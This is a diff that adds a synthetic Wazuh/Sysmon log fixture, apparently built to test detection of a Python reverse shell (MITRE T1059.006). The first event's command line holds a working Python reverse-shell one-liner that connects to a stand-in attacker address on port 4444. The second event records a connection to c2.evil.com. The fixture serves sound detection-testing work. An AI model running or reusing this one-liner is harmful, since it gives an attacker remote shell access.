@@ -1,0 +1,152 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.006",
+    "variation": "001",
+    "name": "Python Reverse Shell",
+    "description": "Python script execution establishing reverse shell connection",
+    "expected_detection": "CRITICAL",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Python executing suspicious script",
+      "sequence": 1,
+      "timestamp": "2026-01-30T10:00:00.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Python Reverse Shell Execution",
+          "id": "100301",
+          "mitre": {
+            "id": [
+              "T1059.006"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Python"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000200.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 10:00:00.000",
+              "processGuid": "{A1B2C3D4-1006-0001-0001-000000000001}",
+              "processId": "5892",
+              "image": "C:\\Python39\\python.exe",
+              "commandLine": "python.exe -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('198.51.100.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
+              "currentDirectory": "C:\\Users\\john.doe\\",
+              "user": "CORP\\john.doe",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=9A11BE5D43B7EF2B6F6B1C8F1C8E8D8E8F8A8B8C8D8E8F8A8B8C8D8E8F8A8B8C",
+              "parentProcessGuid": "{A1B2C3D4-1006-0001-0000-000000000001}",
+              "parentProcessId": "4100",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe /c python.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Python establishing C2 connection",
+      "sequence": 2,
+      "timestamp": "2026-01-30T10:00:01.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 3: Python Outbound Connection",
+          "id": "100302",
+          "mitre": {
+            "id": [
+              "T1059.006",
+              "T1071.001"
+            ],
+            "tactic": [
+              "Execution",
+              "Command and Control"
+            ],
+            "technique": [
+              "Python",
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000200.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 10:00:01.000",
+              "processGuid": "{A1B2C3D4-1006-0001-0001-000000000001}",
+              "processId": "5892",
+              "image": "C:\\Python39\\python.exe",
+              "user": "CORP\\john.doe",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "198.51.100.20",
+              "sourcePort": "52100",
+              "destinationIp": "198.51.100.100",
+              "destinationPort": "4444",
+              "destinationHostname": "c2.evil.com"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
